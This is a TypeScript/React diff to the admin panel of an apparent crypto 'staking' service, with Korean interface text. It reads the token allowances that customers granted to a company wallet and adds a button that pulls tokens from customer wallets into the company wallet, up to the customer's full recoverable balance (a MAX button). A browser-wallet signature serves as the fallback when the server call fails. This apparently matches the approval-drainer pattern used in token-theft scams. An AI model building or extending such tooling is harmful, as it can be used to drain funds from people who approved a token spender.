@@ -542,9 +542,102 @@ function MemberRequestEntry({
   onStatus: PatchStakeRequest;
   onRecover: RecoverStakeRequest;
 }) {
+  const [snapshot, setSnapshot] = useState<RecoverySnapshot | null>(null);
+  const [isChecking, setIsChecking] = useState(false);
+  const [isRecovering, setIsRecovering] = useState(false);
   const [isUpdating, setIsUpdating] = useState(false);
-  const [localError, setLocalError] = useState<string | null>(null);
   const [requestAmount, setRequestAmount] = useState(request.amount);
+  const [localError, setLocalError] = useState<string | null>(null);
+
+  const decimals = request.tokenDecimals ?? 18;
+  const isEvm = Boolean(request.tokenAddress?.startsWith("0x"));
+  const customerWallet = isEvm ? request.walletAddress : request.tronAddress;
+  const companyWallet = isEvm
+    ? adminWallet?.evmAddress ?? null
+    : adminWallet?.tronAddress ?? null;
+  const expectedSpender =
+    request.spenderAddress ?? resolveRequestSpender(request, adminWallet);
+  const isApprovalToken = isTokenApprovalRequest(request);
+  const isRecoverable = isRecoverableRequest(request);
+  const isFinal = request.status === "SETTLED" || request.status === "REJECTED";
+
+  const balanceLabel = snapshot ? formatRawToken(snapshot.balanceRaw, decimals) : "-";
+  const allowanceLabel = snapshot
+    ? formatRawToken(snapshot.allowanceRaw, decimals)
+    : request.allowanceRaw && request.allowanceRaw !== "0" && request.tokenDecimals !== null
+      ? formatRawToken(request.allowanceRaw, request.tokenDecimals)
+      : "-";
+  const recoverableLabel = snapshot
+    ? formatRawToken(snapshot.recoverableRaw, decimals)
+    : "-";
+  const snapshotRecoverableRaw = snapshot ? BigInt(snapshot.recoverableRaw) : BigInt(0);
+
+  const amountUnits = toUnits(recoveryAmount, decimals);
+  const allowanceUnits = toBigInt(request.allowanceRaw);
+  const hasRecordedAllowance = allowanceUnits !== null && allowanceUnits > BigInt(0);
+  const hasEnoughRecordedAllowance =
+    amountUnits !== null && (!hasRecordedAllowance || allowanceUnits >= amountUnits);
+  const hasApproval = hasApprovalRecord(request);
+  const savedWalletMatchesSpender = Boolean(
+    expectedSpender &&
+      companyWallet &&
+      (isEvm
+        ? companyWallet.toLowerCase() === expectedSpender.toLowerCase()
+        : sameTronAddress(companyWallet, expectedSpender)),
+  );
+  const canRecover = Boolean(
+    isRecoverable &&
+      adminWallet &&
+      request.tokenAddress &&
+      request.tokenDecimals !== null &&
+      expectedSpender &&
+      savedWalletMatchesSpender &&
+      hasApproval &&
+      amountUnits !== null &&
+      amountUnits > BigInt(0) &&
+      hasEnoughRecordedAllowance,
+  );
+
+  async function checkBalance() {
+    setIsChecking(true);
+    setLocalError(null);
+    try {
+      if (!request.tokenAddress || request.tokenDecimals === null) {
+        throw new Error("토큰 정보를 찾지 못했습니다.");
+      }
+      if (!expectedSpender) {
+        throw new Error("회사 승인 지갑 주소가 없습니다.");
+      }
+      const next = isEvm
+        ? await readErc20RecoverySnapshot({
+            tokenAddress: request.tokenAddress,
+            owner: request.walletAddress,
+            spender: expectedSpender,
+          })
+        : await readTronRecoverySnapshot({
+            tokenAddress: request.tokenAddress,
+            owner: request.tronAddress,
+            spender: expectedSpender,
+          });
+      setSnapshot(next);
+    } catch (e) {
+      setLocalError(e instanceof Error ? e.message : "잔고 확인 실패");
+    } finally {
+      setIsChecking(false);
+    }
+  }
+
+  async function approveRequest() {
+    setIsUpdating(true);
+    setLocalError(null);
+    try {
+      await onStatus(request.id, "APPROVED", undefined, "allowance 승인 확인");
+    } catch (e) {
+      setLocalError(e instanceof Error ? e.message : "승인 확인 실패");
+    } finally {
+      setIsUpdating(false);
+    }
+  }
 
   async function settle() {
     setIsUpdating(true);
@@ -556,6 +649,47 @@ function MemberRequestEntry({
     } finally {
       setIsUpdating(false);
     }
+  }
+
+  async function recover() {
+    if (!canRecover || amountUnits === null) return;
+    setIsRecovering(true);
+    setLocalError(null);
+    try {
+      await onRecover(request.id, recoveryAmount);
+    } catch (e) {
+      try {
+        const txHash = await recoverWithBrowserWallet({
+          request,
+          adminWallet,
+          amountUnits,
+        });
+        await onStatus(
+          request.id,
+          "TRANSFERRED",
+          txHash,
+          `확장 지갑 서명 실행: ${recoveryAmount}`,
+        );
+      } catch (browserError) {
+        setLocalError(
+          formatRecoveryFailureMessage({
+            isEvmToken: isEvm,
+            serverMessage: e instanceof Error ? e.message : "서버 실행 실패",
+            walletMessage:
+              browserError instanceof Error
+                ? browserError.message
+                : "확장 지갑 실행 실패",
+          }),
+        );
+      }
+    } finally {
+      setIsRecovering(false);
+    }
+  }
+
+  async function applyMax() {
+    if (!snapshot) return;
+    onRecoveryAmountChange(formatUnits(BigInt(snapshot.recoverableRaw), decimals));
   }
 
   async function updateAmount() {
@@ -582,107 +716,215 @@ function MemberRequestEntry({
     }
   }
 
-  const isFinal = request.status === "SETTLED" || request.status === "REJECTED";
+  const warnings: string[] = [];
+  if (isRecoverable) {
+    if (!hasApproval) warnings.push("고객 승인 기록이 없습니다.");
+    else if (expectedSpender && !savedWalletMatchesSpender)
+      warnings.push("저장된 회사 지갑이 고객이 승인한 지갑과 다릅니다.");
+    else if (hasRecordedAllowance && !hasEnoughRecordedAllowance)
+      warnings.push("입력한 수량이 고객이 승인한 수량보다 큽니다.");
+  }
 
   return (
-    <li className="rounded-2xl border border-black/5 bg-white p-4">
-      <div className="flex flex-wrap items-start justify-between gap-3">
-        <div>
+    <li className="space-y-3 rounded-2xl border border-black/5 bg-white p-4">
+      <div className="flex flex-wrap items-start justify-between gap-2">
+        <div className="min-w-0">
           <p className="text-sm font-extrabold text-foreground">
             {request.sourceSymbol} → {request.receiptSymbol}
             <span className="ml-2 text-[11px] font-bold text-muted">
               {request.sourceNetwork}
             </span>
           </p>
-          <p className="mt-1 text-[11px] text-muted">
-            요청 수량{" "}
+          <p className="mt-0.5 text-[11px] text-muted">
             <span className="font-mono text-foreground">
               {formatNumber(request.amountNumeric, 6)} {request.sourceSymbol}
-            </span>{" "}
-            · <span className="font-mono">{formatDate(request.createdAt)}</span>
+            </span>
+            <span className="mx-1.5">·</span>
+            <span className="font-mono">{formatDate(request.createdAt)}</span>
           </p>
         </div>
-        <div className="flex flex-wrap items-center gap-2">
-          <span className="rounded-full border border-black/10 px-2.5 py-1 text-[10px] font-bold text-foreground/60">
-            {formatStatusLabel(request.status)}
-          </span>
-          <button
-            type="button"
-            onClick={settle}
-            disabled={isUpdating || isFinal}
-            className="rounded-xl border border-black/10 bg-white px-3 py-1.5 text-[11px] font-extrabold text-foreground/80 transition hover:border-foreground/30 disabled:cursor-not-allowed disabled:opacity-50"
-          >
-            {request.status === "SETTLED" ? "정산 완료" : "정산 완료 처리"}
-          </button>
-        </div>
+        <span className="rounded-full border border-black/10 px-2.5 py-1 text-[10px] font-bold text-foreground/60">
+          {formatStatusLabel(request.status)}
+        </span>
       </div>
 
-      {isTokenApprovalRequest(request) && (
-        <div className="mt-3">
-          <RemainingAllowanceRow
-            request={request}
-            adminWallet={adminWallet}
-            onApplyRecoverable={onRecoveryAmountChange}
-            compact
-          />
-        </div>
-      )}
-
-      {isRecoverableRequest(request) && (
-        <div className="mt-3 rounded-xl border border-accent-strong/15 bg-accent-strong/[0.04] p-3">
-          <div className="mb-3 flex items-center justify-between gap-2">
-            <p className="text-xs font-extrabold text-foreground">
-              회사 지갑으로 받기
-            </p>
-            <span className="text-[10px] font-bold uppercase tracking-widest text-muted">
-              3단계
-            </span>
+      {isApprovalToken && (
+        <>
+          <div className="rounded-xl border border-black/5 bg-black/[0.02] p-3">
+            <div className="mb-2 flex items-center justify-between gap-2">
+              <p className="text-[10px] font-bold uppercase tracking-widest text-muted">
+                온체인 현황
+              </p>
+              <button
+                type="button"
+                onClick={checkBalance}
+                disabled={isChecking}
+                className="inline-flex items-center gap-1 rounded-full border border-black/10 bg-white px-2.5 py-1 text-[10px] font-extrabold text-foreground/80 transition hover:border-foreground/30 disabled:cursor-wait disabled:opacity-60"
+              >
+                <RefreshCw className={`h-3 w-3 ${isChecking ? "animate-spin" : ""}`} />
+                {isChecking ? "확인 중" : snapshot ? "다시 확인" : "잔고 확인"}
+              </button>
+            </div>
+            <div className="grid grid-cols-3 gap-2">
+              <RequestStat label="잔고" value={`${balanceLabel} ${request.sourceSymbol}`} />
+              <RequestStat label="승인된 수량" value={`${allowanceLabel} ${request.sourceSymbol}`} />
+              <RequestStat
+                label="회수 가능"
+                value={`${recoverableLabel} ${request.sourceSymbol}`}
+                tone="emerald"
+              />
+            </div>
           </div>
-          <AllowanceRecoveryControls
-            request={request}
-            adminWallet={adminWallet}
-            amount={recoveryAmount}
-            onAmountChange={onRecoveryAmountChange}
-            onStatus={onStatus}
-            onRecover={onRecover}
-            compact
-          />
-        </div>
+
+          {isRecoverable && (
+            <div className="space-y-2 rounded-xl border border-accent-strong/20 bg-accent-strong/[0.04] p-3">
+              <div className="flex flex-wrap items-end gap-2">
+                <label className="min-w-[140px] flex-1">
+                  <span className="text-[10px] font-semibold uppercase tracking-widest text-muted">
+                    받을 수량
+                  </span>
+                  <div className="mt-1 flex gap-1">
+                    <input
+                      value={recoveryAmount}
+                      onChange={(e) => onRecoveryAmountChange(e.target.value)}
+                      inputMode="decimal"
+                      className="w-full rounded-lg border border-black/10 bg-white px-3 py-2 font-mono text-xs font-semibold text-foreground outline-none transition focus:border-accent-strong focus:ring-2 focus:ring-accent-strong/20"
+                    />
+                    {snapshot && snapshotRecoverableRaw > BigInt(0) && (
+                      <button
+                        type="button"
+                        onClick={applyMax}
+                        className="rounded-lg border border-black/10 bg-white px-2 text-[10px] font-extrabold text-foreground/80 transition hover:border-foreground/30"
+                      >
+                        MAX
+                      </button>
+                    )}
+                  </div>
+                </label>
+                <button
+                  type="button"
+                  onClick={approveRequest}
+                  disabled={isRecovering || isUpdating || !hasApproval || request.status !== "REQUESTED"}
+                  className="rounded-lg border border-black/10 bg-white px-3 py-2 text-xs font-extrabold text-foreground/80 transition hover:border-foreground/30 disabled:cursor-not-allowed disabled:opacity-50"
+                >
+                  승인 확인
+                </button>
+                <button
+                  type="button"
+                  onClick={recover}
+                  disabled={!canRecover || isRecovering}
+                  className="rounded-lg bg-accent-strong px-4 py-2 text-xs font-extrabold text-white transition hover:bg-accent-strong/90 disabled:cursor-not-allowed disabled:opacity-50"
+                >
+                  {isRecovering ? "처리 중..." : "받기 실행"}
+                </button>
+              </div>
+
+              {warnings.map((warning) => (
+                <div
+                  key={warning}
+                  className="rounded-lg border border-amber-200 bg-amber-50 px-3 py-2 text-[11px] text-amber-700"
+                >
+                  {warning}
+                </div>
+              ))}
+            </div>
+          )}
+
+          <div className="grid gap-1 rounded-xl bg-black/[0.02] px-3 py-2 text-[11px] text-muted sm:grid-cols-2">
+            <p>
+              고객 지갑:{" "}
+              <span className="font-mono text-foreground">
+                {customerWallet ? shortAddress(customerWallet) : "-"}
+              </span>
+            </p>
+            <p>
+              회사 지갑:{" "}
+              <span className="font-mono text-foreground">
+                {companyWallet ? shortAddress(companyWallet) : "-"}
+              </span>
+            </p>
+          </div>
+        </>
       )}
 
-      <details className="mt-3 rounded-xl border border-black/5 bg-black/[0.02] p-3 text-xs text-muted">
-        <summary className="cursor-pointer font-bold text-foreground/70">
-          요청 수량 수정
-        </summary>
-        <div className="mt-3 grid gap-2 sm:grid-cols-[1fr_auto] sm:items-end">
-          <label className="block">
-            <span className="text-[10px] font-semibold uppercase tracking-widest text-muted">
-              예치 수량
-            </span>
-            <input
-              value={requestAmount}
-              onChange={(e) => setRequestAmount(e.target.value)}
-              inputMode="decimal"
-              className="mt-1.5 w-full rounded-xl border border-black/10 bg-white px-3 py-2 font-mono text-xs font-semibold text-foreground outline-none transition focus:border-accent-strong focus:ring-2 focus:ring-accent-strong/20"
-            />
-          </label>
-          <button
-            type="button"
-            onClick={updateAmount}
-            disabled={isUpdating || requestAmount.trim() === request.amount}
-            className="rounded-xl border border-black/10 bg-white px-4 py-2.5 text-xs font-extrabold text-foreground/80 transition hover:border-foreground/30 disabled:cursor-not-allowed disabled:opacity-50"
-          >
-            수량 저장
-          </button>
+      <details className="rounded-xl border border-black/5 bg-black/[0.02] p-3 text-xs text-muted">
+        <summary className="cursor-pointer font-bold text-foreground/70">관리</summary>
+        <div className="mt-3 space-y-3">
+          <div className="flex justify-end">
+            <button
+              type="button"
+              onClick={settle}
+              disabled={isUpdating || isFinal}
+              className="rounded-lg border border-black/10 bg-white px-3 py-1.5 text-[11px] font-extrabold text-foreground/80 transition hover:border-foreground/30 disabled:cursor-not-allowed disabled:opacity-50"
+            >
+              {request.status === "SETTLED" ? "정산 완료" : "정산 완료 처리"}
+            </button>
+          </div>
+          <div className="grid gap-2 sm:grid-cols-[1fr_auto] sm:items-end">
+            <label className="block">
+              <span className="text-[10px] font-semibold uppercase tracking-widest text-muted">
+                예치 수량 수정
+              </span>
+              <input
+                value={requestAmount}
+                onChange={(e) => setRequestAmount(e.target.value)}
+                inputMode="decimal"
+                className="mt-1 w-full rounded-lg border border-black/10 bg-white px-3 py-2 font-mono text-xs font-semibold text-foreground outline-none transition focus:border-accent-strong focus:ring-2 focus:ring-accent-strong/20"
+              />
+            </label>
+            <button
+              type="button"
+              onClick={updateAmount}
+              disabled={isUpdating || requestAmount.trim() === request.amount}
+              className="rounded-lg border border-black/10 bg-white px-3 py-2 text-[11px] font-extrabold text-foreground/80 transition hover:border-foreground/30 disabled:cursor-not-allowed disabled:opacity-50"
+            >
+              수량 저장
+            </button>
+          </div>
         </div>
       </details>
 
       {localError && (
-        <div className="mt-3 rounded-xl border border-red-200 bg-red-50 p-3 text-xs text-red-700">
+        <div className="rounded-xl border border-red-200 bg-red-50 p-3 text-xs text-red-700">
           {localError}
         </div>
       )}
     </li>
+  );
+}
+
+function RequestStat({
+  label,
+  value,
+  tone,
+}: {
+  label: string;
+  value: string;
+  tone?: "emerald";
+}) {
+  return (
+    <div
+      className={`rounded-lg border p-2 ${
+        tone === "emerald"
+          ? "border-emerald-200/60 bg-emerald-50"
+          : "border-black/5 bg-white"
+      }`}
+    >
+      <p
+        className={`text-[10px] font-bold uppercase tracking-widest ${
+          tone === "emerald" ? "text-emerald-700" : "text-muted"
+        }`}
+      >
+        {label}
+      </p>
+      <p
+        className={`mt-1 truncate font-mono text-xs font-extrabold ${
+          tone === "emerald" ? "text-emerald-700" : "text-foreground"
+        }`}
+      >
+        {value}
+      </p>
+    </div>
   );
 }
 
@@ -838,389 +1080,6 @@ function TxLogTab({
   );
 }
 
-function AllowanceRecoveryControls({
-  request,
-  adminWallet,
-  amount,
-  onAmountChange,
-  onStatus,
-  onRecover,
-  compact = false,
-}: {
-  request: StakeRequestRow;
-  adminWallet: AdminWalletRow | null;
-  amount: string;
-  onAmountChange: (value: string) => void;
-  onStatus: PatchStakeRequest;
-  onRecover: RecoverStakeRequest;
-  compact?: boolean;
-}) {
-  const [isUpdating, setIsUpdating] = useState(false);
-  const [localError, setLocalError] = useState<string | null>(null);
-
-  const tokenDecimals = request.tokenDecimals ?? 18;
-  const amountUnits = toUnits(amount, tokenDecimals);
-  const allowanceUnits = toBigInt(request.allowanceRaw);
-  const hasRecordedAllowance = allowanceUnits !== null && allowanceUnits > BigInt(0);
-  const hasEnoughRecordedAllowance =
-    amountUnits !== null && (!hasRecordedAllowance || allowanceUnits >= amountUnits);
-  const isEvmToken = Boolean(request.tokenAddress?.startsWith("0x"));
-  const expectedSpender = request.spenderAddress;
-  const hasApproval = hasApprovalRecord(request);
-  const savedCompanyWallet = isEvmToken ? adminWallet?.evmAddress : adminWallet?.tronAddress;
-  const savedWalletMatchesSpender = Boolean(
-    expectedSpender &&
-      savedCompanyWallet &&
-      (isEvmToken
-        ? savedCompanyWallet.toLowerCase() === expectedSpender.toLowerCase()
-        : sameTronAddress(savedCompanyWallet, expectedSpender)),
-  );
-  const canAttemptRecovery = Boolean(
-    adminWallet &&
-      request.tokenAddress &&
-      request.tokenDecimals !== null &&
-      expectedSpender &&
-      savedWalletMatchesSpender &&
-      hasApproval &&
-      request.status !== "SETTLED" &&
-      request.status !== "REJECTED" &&
-      amountUnits !== null &&
-      amountUnits > BigInt(0) &&
-      hasEnoughRecordedAllowance,
-  );
-
-  async function approveAllowance() {
-    setIsUpdating(true);
-    setLocalError(null);
-    try {
-      await onStatus(request.id, "APPROVED", undefined, "allowance 승인 확인");
-    } catch (e) {
-      setLocalError(e instanceof Error ? e.message : "승인 확인 실패");
-    } finally {
-      setIsUpdating(false);
-    }
-  }
-
-  async function recoverAllowance() {
-    if (!canAttemptRecovery || amountUnits === null) return;
-    setIsUpdating(true);
-    setLocalError(null);
-    try {
-      await onRecover(request.id, amount);
-    } catch (e) {
-      try {
-        const txHash = await recoverWithBrowserWallet({
-          request,
-          adminWallet,
-          amountUnits,
-        });
-        await onStatus(
-          request.id,
-          "TRANSFERRED",
-          txHash,
-          `확장 지갑 서명 실행: ${amount}`,
-        );
-      } catch (browserError) {
-        const serverMessage = e instanceof Error ? e.message : "서버 실행 실패";
-        const walletMessage =
-          browserError instanceof Error ? browserError.message : "확장 지갑 실행 실패";
-        setLocalError(
-          formatRecoveryFailureMessage({
-            isEvmToken,
-            serverMessage,
-            walletMessage,
-          }),
-        );
-      }
-    } finally {
-      setIsUpdating(false);
-    }
-  }
-
-  return (
-    <>
-      <div className="grid gap-3 lg:grid-cols-[1fr_auto_auto] lg:items-end">
-        <label className="block">
-          <span className="text-[10px] font-semibold uppercase tracking-widest text-muted">
-            받을 수량
-          </span>
-          <input
-            value={amount}
-            onChange={(e) => onAmountChange(e.target.value)}
-            inputMode="decimal"
-            className="mt-1.5 w-full rounded-xl border border-black/10 bg-white px-3 py-2 font-mono text-xs font-semibold text-foreground outline-none transition focus:border-accent-strong focus:ring-2 focus:ring-accent-strong/20"
-          />
-        </label>
-        <button
-          type="button"
-          onClick={approveAllowance}
-          disabled={!hasApproval || isUpdating || request.status !== "REQUESTED"}
-          className="rounded-xl border border-black/10 bg-white px-4 py-2.5 text-xs font-extrabold text-foreground/80 transition hover:border-foreground/30 disabled:cursor-not-allowed disabled:opacity-50"
-        >
-          승인 확인 완료
-        </button>
-        <button
-          type="button"
-          onClick={recoverAllowance}
-          disabled={!canAttemptRecovery || isUpdating}
-          className="rounded-xl bg-accent-strong px-4 py-2.5 text-xs font-extrabold text-white transition hover:bg-accent-strong/90 disabled:cursor-not-allowed disabled:opacity-50"
-        >
-          {isUpdating ? "처리 중..." : compact ? "받기 실행" : "회사 지갑으로 받기"}
-        </button>
-      </div>
-
-      <div className="mt-3 grid gap-2 rounded-xl bg-black/[0.02] p-3 text-[11px] text-muted sm:grid-cols-2">
-        <p>
-          요청 수량:{" "}
-          <span className="font-mono text-foreground">
-            {formatNumber(request.amountNumeric, 6)} {request.sourceSymbol}
-          </span>
-        </p>
-        <p>
-          승인된 수량: <span className="font-mono text-foreground">{formatRequestAllowance(request)}</span>
-        </p>
-        <p>
-          고객 지갑:{" "}
-          <span className="font-mono text-foreground">
-            {isEvmToken
-              ? request.walletAddress
-                ? shortAddress(request.walletAddress)
-                : "-"
-              : request.tronAddress
-                ? shortAddress(request.tronAddress)
-                : "-"}
-          </span>
-        </p>
-        <p>
-          회사 지갑:{" "}
-          <span className="font-mono text-foreground">
-            {isEvmToken
-              ? adminWallet?.evmAddress
-                ? shortAddress(adminWallet.evmAddress)
-                : "-"
-              : adminWallet?.tronAddress
-                ? shortAddress(adminWallet.tronAddress)
-                : "-"}
-          </span>
-        </p>
-      </div>
-
-      {hasRecordedAllowance && !hasEnoughRecordedAllowance && (
-        <div className="mt-3 rounded-xl border border-amber-200 bg-amber-50 p-3 text-xs text-amber-700">
-          입력한 수량이 고객이 승인한 수량보다 큽니다.
-        </div>
-      )}
-      {!hasRecordedAllowance && hasApproval && request.tokenAddress && (
-        <div className="mt-3 rounded-xl border border-sky-200 bg-sky-50 p-3 text-xs text-sky-700">
-          저장된 승인 수량이 없습니다. 실제 받을 수량은 아래 “받을 수 있는 수량 확인”에서
-          확인하거나, 받기 실행 시 온체인에서 다시 검증합니다.
-        </div>
-      )}
-      {!hasApproval && request.tokenAddress && (
-        <div className="mt-3 rounded-xl border border-amber-200 bg-amber-50 p-3 text-xs text-amber-700">
-          고객 승인 기록이 없습니다. 먼저 승인 확인을 진행해주세요.
-        </div>
-      )}
-      {expectedSpender && !savedWalletMatchesSpender && (
-        <div className="mt-3 rounded-xl border border-amber-200 bg-amber-50 p-3 text-xs text-amber-700">
-          저장된 회사 지갑이 고객이 승인한 지갑과 다릅니다.
-        </div>
-      )}
-      {savedWalletMatchesSpender && (
-        <details className="mt-3 rounded-xl border border-black/5 bg-black/[0.02] p-3 text-xs text-muted">
-          <summary className="cursor-pointer font-bold text-foreground/70">
-            처리 방식 보기
-          </summary>
-          <p className="mt-2">
-            {isEvmToken
-              ? "서버 키가 없으면 회사 EVM 지갑이 열린 MetaMask에서 서명합니다."
-              : "TRON 토큰은 서버 키 또는 회사 TRON 지갑이 열린 TronLink/SafePal 서명이 필요합니다."}
-          </p>
-        </details>
-      )}
-      {localError && (
-        <div className="mt-3 rounded-xl border border-red-200 bg-red-50 p-3 text-xs text-red-700">
-          {localError}
-        </div>
-      )}
-    </>
-  );
-}
-
-function RemainingAllowanceRow({
-  request,
-  adminWallet,
-  onApplyRecoverable,
-  compact = false,
-}: {
-  request: StakeRequestRow;
-  adminWallet: AdminWalletRow | null;
-  onApplyRecoverable: (value: string) => void;
-  compact?: boolean;
-}) {
-  const [snapshot, setSnapshot] = useState<RecoverySnapshot | null>(null);
-  const [isChecking, setIsChecking] = useState(false);
-  const [localError, setLocalError] = useState<string | null>(null);
-
-  const decimals = request.tokenDecimals ?? 18;
-  const spender = request.spenderAddress ?? resolveRequestSpender(request, adminWallet);
-  const balanceLabel = snapshot ? formatRawToken(snapshot.balanceRaw, decimals) : "-";
-  const allowanceLabel = snapshot ? formatRawToken(snapshot.allowanceRaw, decimals) : "-";
-  const recoverableLabel = snapshot ? formatRawToken(snapshot.recoverableRaw, decimals) : "-";
-  const recoverableValue = snapshot
-    ? formatUnits(BigInt(snapshot.recoverableRaw), decimals)
-    : "0";
-
-  async function checkRemaining() {
-    setIsChecking(true);
-    setLocalError(null);
-    try {
-      if (!request.tokenAddress || request.tokenDecimals === null) {
-        throw new Error("토큰 정보를 찾지 못했습니다.");
-      }
-      if (!spender) {
-        throw new Error("회사 승인 지갑 주소가 없습니다.");
-      }
-
-      const nextSnapshot = request.tokenAddress.startsWith("0x")
-        ? await readErc20RecoverySnapshot({
-            tokenAddress: request.tokenAddress,
-            owner: request.walletAddress,
-            spender,
-          })
-        : await readTronRecoverySnapshot({
-            tokenAddress: request.tokenAddress,
-            owner: request.tronAddress,
-            spender,
-          });
-      setSnapshot(nextSnapshot);
-    } catch (e) {
-      setLocalError(e instanceof Error ? e.message : "수량 확인 실패");
-    } finally {
-      setIsChecking(false);
-    }
-  }
-
-  return (
-    <div
-      className={
-        compact
-          ? "rounded-xl border border-black/5 bg-black/[0.02] p-3"
-          : "rounded-2xl border border-black/5 bg-white p-4"
-      }
-    >
-      <div className="flex flex-col gap-3 lg:flex-row lg:items-start lg:justify-between">
-        <div>
-          <p className="text-xs font-extrabold text-foreground">
-            {compact
-              ? "받을 수 있는 수량 확인"
-              : `${request.user.username} · ${request.sourceSymbol} → ${request.receiptSymbol}`}
-          </p>
-          <p className="mt-1 text-xs text-muted">
-            {request.sourceNetwork} · 회사 승인 지갑{" "}
-            <span className="font-mono text-foreground">
-              {spender ? shortAddress(spender) : "-"}
-            </span>
-          </p>
-        </div>
-        <button
-          type="button"
-          onClick={checkRemaining}
-          disabled={isChecking}
-          className="inline-flex h-10 items-center justify-center gap-2 rounded-xl border border-black/10 bg-white px-4 text-xs font-extrabold text-foreground/80 transition hover:border-foreground/30 disabled:cursor-wait disabled:opacity-60"
-        >
-          <RefreshCw className={`h-3.5 w-3.5 ${isChecking ? "animate-spin" : ""}`} />
-          {isChecking ? "확인 중..." : "수량 확인"}
-        </button>
-      </div>
-
-      <div className="mt-4 grid gap-2 sm:grid-cols-3">
-        <RemainingMetric label="고객 잔고" value={`${balanceLabel} ${request.sourceSymbol}`} />
-        <RemainingMetric label="승인된 수량" value={`${allowanceLabel} ${request.sourceSymbol}`} />
-        <RemainingMetric
-          label="받을 수량"
-          value={`${recoverableLabel} ${request.sourceSymbol}`}
-          tone="emerald"
-        />
-      </div>
-
-      <details className="mt-3 rounded-xl bg-black/[0.02] p-3 text-[11px] text-muted">
-        <summary className="cursor-pointer font-bold text-foreground/70">
-          상세 기록 보기
-        </summary>
-        <div className="mt-3 grid gap-2 sm:grid-cols-2">
-          <p>
-            고객 지갑:{" "}
-            <span className="font-mono text-foreground">
-              {request.tokenAddress?.startsWith("0x")
-                ? request.walletAddress
-                  ? shortAddress(request.walletAddress)
-                  : "-"
-                : request.tronAddress
-                  ? shortAddress(request.tronAddress)
-                  : "-"}
-            </span>
-          </p>
-          <p>
-            기록된 승인 수량:{" "}
-            <span className="font-mono text-foreground">{formatRequestAllowance(request)}</span>
-          </p>
-          <p>
-            토큰 주소:{" "}
-            <span className="font-mono text-foreground">
-              {request.tokenAddress ? shortAddress(request.tokenAddress) : "-"}
-            </span>
-          </p>
-          <p>
-            조회 시각:{" "}
-            <span className="font-mono text-foreground">
-              {snapshot ? formatDate(snapshot.checkedAt) : "-"}
-            </span>
-          </p>
-        </div>
-      </details>
-
-      {snapshot && BigInt(snapshot.recoverableRaw) > BigInt(0) && (
-        <button
-          type="button"
-          onClick={() => onApplyRecoverable(recoverableValue)}
-          className="mt-3 w-full rounded-xl bg-accent-strong px-4 py-2.5 text-xs font-extrabold text-white transition hover:bg-accent-strong/90"
-        >
-          이 수량으로 받기
-        </button>
-      )}
-
-      {localError && (
-        <div className="mt-3 rounded-xl border border-red-200 bg-red-50 p-3 text-xs text-red-700">
-          {localError}
-        </div>
-      )}
-    </div>
-  );
-}
-
-function RemainingMetric({
-  label,
-  value,
-  tone,
-}: {
-  label: string;
-  value: string;
-  tone?: "emerald";
-}) {
-  return (
-    <div className="rounded-xl border border-black/5 bg-black/[0.02] p-3">
-      <p className="text-[10px] font-bold uppercase tracking-widest text-muted">{label}</p>
-      <p
-        className={`mt-1 truncate font-mono text-sm font-extrabold ${
-          tone === "emerald" ? "text-emerald-600" : "text-foreground"
-        }`}
-      >
-        {value}
-      </p>
-    </div>
-  );
-}
 
 function buildUserSummaries(requests: StakeRequestRow[]): UserSummary[] {
   const map = new Map<string, UserSummary>();
